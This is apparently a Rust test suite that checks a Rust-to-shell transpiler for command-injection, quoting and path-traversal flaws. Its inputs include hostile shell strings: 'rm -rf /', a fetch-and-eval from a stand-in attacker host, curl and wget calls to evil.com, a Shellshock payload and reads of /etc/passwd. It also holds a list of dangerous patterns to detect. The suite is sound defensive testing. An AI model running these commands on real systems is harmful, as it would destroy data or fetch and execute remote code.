//! # SPRINT 3 TICKET-1003 RED: Adversarial Injection Testing
//!
//! This module implements comprehensive adversarial testing to verify that
//! the verification framework catches ALL injection vectors.
//!
//! Following 反省 (Hansei) - Fix Before Adding:
//! Complete the verification framework before adding new features.
//!
//! ## Security Testing Philosophy
//! 1. Assume adversarial input
//! 2. Test all known injection patterns
//! 3. Verify validation catches them BEFORE code generation
//! 4. Ensure no false negatives (missed attacks)

use crate::{transpile, Config};

/// Helper to assert transpilation succeeds (for patterns that are safe in quoted strings)
fn assert_transpiles_ok(source: &str, description: &str) {
    let config = Config::default();
    match transpile(source, config) {
        Ok(_) => {} // Success — bare semicolons in quoted strings are safe
        Err(e) => {
            panic!(
                "{}: Expected transpilation to succeed, but got error: {}",
                description, e
            );
        }
    }
}

/// Helper to test if transpilation correctly rejects malicious input
fn assert_rejects_malicious(source: &str, attack_description: &str) {
    let config = Config::default();

    match transpile(source, config) {
        Ok(script) => {
            // If it transpiles, verify the attack is neutered
            // Check for common injection patterns in output
            let dangerous_patterns = vec![
                "; rm ",
                "| rm ",
                "$(rm",
                "`rm",
                "&& rm",
                "|| rm",
                "; cat /etc/passwd",
                "| curl",
                "$(wget",
            ];

            for pattern in dangerous_patterns {
                assert!(
                    !script.contains(pattern),
                    "{}: Dangerous pattern '{}' found in output:\n{}",
                    attack_description,
                    pattern,
                    script
                );
            }
        }
        Err(e) => {
            // Validation rejected it - this is good!
            // Verify it's for the right reason
            let error_str = e.to_string();
            let error_lower = error_str.to_lowercase();
            assert!(
                error_lower.contains("validation")
                    || error_lower.contains("unsafe")
                    || error_lower.contains("injection")
                    || error_lower.contains("detected")
                    || error_str.contains("SC"),
                "{}: Rejected but wrong error: {}",
                attack_description,
                error_str
            );
        }
    }
}

// ============================================================================
// CATEGORY 1: Command Injection via String Literals
// ============================================================================

#[test]
fn test_semicolon_in_string_is_safe() {
    // Bare semicolons in double-quoted strings are safe in shell
    // echo "; rm -rf /" does NOT execute rm — the semicolon is quoted
    let source = r#"
        fn main() {
            let cmd = "; rm -rf /";
            echo(cmd);
        }
    "#;

    assert_transpiles_ok(source, "Bare semicolon in quoted string is safe");
}

#[test]
fn test_injection_pipe_command() {
    let source = r#"
        fn main() {
            let cmd = "| cat /etc/passwd";
            echo(cmd);
        }
    "#;

    assert_rejects_malicious(source, "Pipe command injection");
}

#[test]
fn test_injection_command_substitution() {
    let source = r#"
        fn main() {
            let cmd = "$(whoami)";
            echo(cmd);
        }
    "#;

    assert_rejects_malicious(source, "Command substitution injection");
}

#[test]
fn test_injection_backtick_substitution() {
    let source = r#"
        fn main() {
            let cmd = "`reboot`";
            echo(cmd);
        }
    "#;

    assert_rejects_malicious(source, "Backtick substitution injection");
}

#[test]
fn test_injection_and_operator() {
    let source = r#"
        fn main() {
            let cmd = "&& curl evil.com";
            echo(cmd);
        }
    "#;

    assert_rejects_malicious(source, "AND operator injection");
}

#[test]
fn test_injection_or_operator() {
    let source = r#"
        fn main() {
            let cmd = "|| wget malware";
            echo(cmd);
        }
    "#;

    assert_rejects_malicious(source, "OR operator injection");
}

// ============================================================================
// CATEGORY 2: Path Traversal Attacks
// ============================================================================

#[test]
fn test_path_traversal_dotdot() {
    let source = r#"
        fn main() {
            let path = "../../../etc/passwd";
            echo(path);
        }
    "#;

    // Path traversal in strings should be allowed (properly quoted)
    // but verify it doesn't execute
    let config = Config::default();
    let result = transpile(source, config);

    match result {
        Ok(script) => {
            // Should be quoted when used, or safely assigned
            eprintln!("Generated script:\n{}", script);
            // Check that the path is either:
            // 1. Quoted in assignment: path='...' or path="..."
            // 2. Or quoted when used: echo "$path" or echo '$path'
            let has_quoted_assignment = script.contains("path='../../../etc/passwd'")
                || script.contains("path=\"../../../etc/passwd\"");
            let has_quoted_usage = script.contains("\"$path\"") || script.contains("'$path'");

            assert!(
                has_quoted_assignment || has_quoted_usage,
                "Path traversal must be quoted either in assignment or usage"
            );
        }
        Err(e) => {
            // Also acceptable to reject
            eprintln!("Rejected with: {}", e);
        }
    }
}

#[test]
fn test_path_traversal_absolute() {
    let source = r#"
        fn main() {
            let path = "/etc/passwd";
            echo(path);
        }
    "#;

    // Absolute paths should be allowed if properly quoted
    let config = Config::default();
    let result = transpile(source, config);

    assert!(
        result.is_ok(),
        "Absolute paths should be allowed in strings"
    );
}

// ============================================================================
// CATEGORY 3: Variable Expansion Attacks
// ============================================================================

#[test]
fn test_injection_unquoted_variable() {
    let source = r#"
        fn main() {
            let malicious = "$(rm -rf /)";
            echo(malicious);
        }
    "#;

    assert_rejects_malicious(source, "Unquoted variable expansion");
}

#[test]
fn test_injection_dollar_in_string() {
    let source = r#"
        fn main() {
            let msg = "Hello $USER, your home is $HOME";
            echo(msg);
        }
    "#;

    // Dollar signs in string literals should be safe (quoted)
    let config = Config::default();
    let result = transpile(source, config);

    match result {
        Ok(script) => {
            // Should be in single quotes (no expansion) or escaped
            assert!(
                script.contains("'Hello $USER") || script.contains("\\$USER"),
                "Dollar signs not properly escaped"
            );
        }
        Err(_) => {
            // Also acceptable to be very strict
        }
    }
}

// ============================================================================
// CATEGORY 4: Glob Expansion Attacks
// ============================================================================

#[test]
fn test_glob_asterisk() {
    let source = r#"
        fn main() {
            let pattern = "*";
            echo(pattern);
        }
    "#;

    // Glob patterns should be quoted to prevent expansion
    let config = Config::default();
    let result = transpile(source, config);

    match result {
        Ok(script) => {
            // Should be quoted
            assert!(
                script.contains("'*'") || script.contains("\"*\""),
                "Glob pattern not quoted"
            );
        }
        Err(_) => {}
    }
}

#[test]
fn test_glob_question_mark() {
    let source = r#"
        fn main() {
            let pattern = "file?.txt";
            echo(pattern);
        }
    "#;

    let config = Config::default();
    let result = transpile(source, config);

    assert!(result.is_ok(), "Question mark in string should be allowed");
}

// ============================================================================
// CATEGORY 5: Newline and Control Character Injection
// ============================================================================

#[test]
fn test_injection_newline_command() {
    let source = r#"
        fn main() {
            let cmd = "hello\nrm -rf /";
            echo(cmd);
        }
    "#;

    assert_rejects_malicious(source, "Newline injection");
}

#[test]
fn test_injection_carriage_return() {
    let source = r#"
        fn main() {
            let cmd = "hello\rcurl evil.com";
            echo(cmd);
        }
    "#;

    assert_rejects_malicious(source, "Carriage return injection");
}

#[test]
fn test_injection_null_byte() {
    let source = r#"
        fn main() {
            let cmd = "hello\0world";
            echo(cmd);
        }
    "#;

    // Null bytes should be handled safely
    let config = Config::default();
    let result = transpile(source, config);

    // Either rejected or properly escaped
    match result {
        Ok(script) => {
            assert!(!script.contains("\0"), "Null byte in output");
        }
        Err(_) => {
            // Acceptable to reject
        }
    }
}

// ============================================================================
// CATEGORY 6: Quote Escaping Attacks
// ============================================================================

#[test]
fn test_injection_quote_escape() {
    let source = r#"
        fn main() {
            let cmd = "'; rm -rf /; echo '";
            echo(cmd);
        }
    "#;

    assert_rejects_malicious(source, "Quote escape injection");
}

#[test]
fn test_injection_double_quote_escape() {
    let source = r#"
        fn main() {
            let cmd = "\"; rm -rf /; echo \"";
            echo(cmd);
        }
    "#;

    assert_rejects_malicious(source, "Double quote escape injection");
}

// ============================================================================
// CATEGORY 7: Environment Variable Manipulation
// ============================================================================

#[test]
fn test_injection_ifs_manipulation() {
    let source = r#"
        fn main() {
            let attack = "IFS=';';eval$(cat /etc/passwd)";
            echo(attack);
        }
    "#;

    assert_rejects_malicious(source, "IFS manipulation attack");
}

#[test]
fn test_injection_path_manipulation() {
    let source = r#"
        fn main() {
            let attack = "PATH=/tmp:$PATH";
            echo(attack);
        }
    "#;

    // PATH in string literal is safe if quoted
    let config = Config::default();
    let result = transpile(source, config);

    assert!(result.is_ok(), "PATH in string literal should be allowed");
}

// ============================================================================
// CATEGORY 8: Here-doc and Here-string Attacks
// ============================================================================

#[test]
fn test_injection_heredoc_syntax() {
    let source = r#"
        fn main() {
            let attack = "<< EOF\nrm -rf /\nEOF";
            echo(attack);
        }
    "#;

    assert_rejects_malicious(source, "Here-doc syntax injection");
}

// ============================================================================
// CATEGORY 9: Complex Multi-stage Attacks
// ============================================================================

#[test]
fn test_complex_injection_chain() {
    let source = r#"
        fn main() {
            let stage1 = "$(curl attacker.com/stage2.sh)";
            let stage2 = "; eval $stage1";
            echo(stage2);
        }
    "#;

    assert_rejects_malicious(source, "Multi-stage injection");
}

#[test]
fn test_obfuscated_injection() {
    let source = r#"
        fn main() {
            let obf = "$((0x72))$((0x6d))";  // hex for "rm"
            echo(obf);
        }
    "#;

    // Arithmetic expansion should be safe in strings
    let config = Config::default();
    let result = transpile(source, config);

    match result {
        Ok(script) => {
            // Should be quoted
            assert!(
                script.contains("'$((") || script.contains("\"$(("),
                "Arithmetic expansion not quoted"
            );
        }
        Err(_) => {}
    }
}

// ============================================================================
// CATEGORY 10: Real-world Attack Patterns
// ============================================================================

#[test]
fn test_real_world_log4j_style() {
    let source = r#"
        fn main() {
            let user_agent = "${jndi:ldap://evil.com/a}";
            echo(user_agent);
        }
    "#;

    // JNDI-style attacks should be safe in quoted strings
    let config = Config::default();
    let result = transpile(source, config);

    assert!(result.is_ok(), "JNDI syntax in string should be quoted");
}

#[test]
fn test_real_world_shellshock() {
    let source = r#"
        fn main() {
            let env_var = "() { :; }; /bin/bash -c 'cat /etc/passwd'";
            echo(env_var);
        }
    "#;

    assert_rejects_malicious(source, "Shellshock-style attack");
}

#[test]
fn test_semicolon_in_filename_is_safe() {
    // Bare semicolons in double-quoted strings are safe in shell
    // filename='file.txt; rm -rf /' followed by echo "${filename}" is NOT injection
    let source = r#"
        fn main() {
            let filename = "file.txt; rm -rf /";
            echo(filename);
        }
    "#;

    assert_transpiles_ok(source, "Bare semicolon in filename string is safe");
}

// ============================================================================
// CATEGORY 11: Validation Framework Tests
// ============================================================================

#[test]
fn test_validation_catches_known_patterns() {
    // Test that our validation catches known-bad patterns
    // Note: bare "; " is NOT dangerous inside double-quoted shell strings
    let patterns = vec!["| cat", "$(curl", "`wget", "&& malicious", "|| evil"];

    for pattern in patterns {
        let source = format!(
            r#"
            fn main() {{
                let cmd = "{}";
                echo(cmd);
            }}
        "#,
            pattern
        );

        assert_rejects_malicious(&source, &format!("Pattern: {}", pattern));
    }
}

#[test]
fn test_safe_strings_allowed() {
    // Verify we don't have false positives
    let safe_strings = vec![
        "Hello, World!",
        "File version 1.0",
        "user@example.com",
        "https://safe-url.com",
        "Price: $19.99",
    ];

    for safe in safe_strings {
        let source = format!(
            r#"
            fn main() {{
                let msg = "{}";
                echo(msg);
            }}
        "#,
            safe
        );

        let config = Config::default();
        let result = transpile(&source, config);

        assert!(result.is_ok(), "Safe string '{}' should be allowed", safe);
    }
}
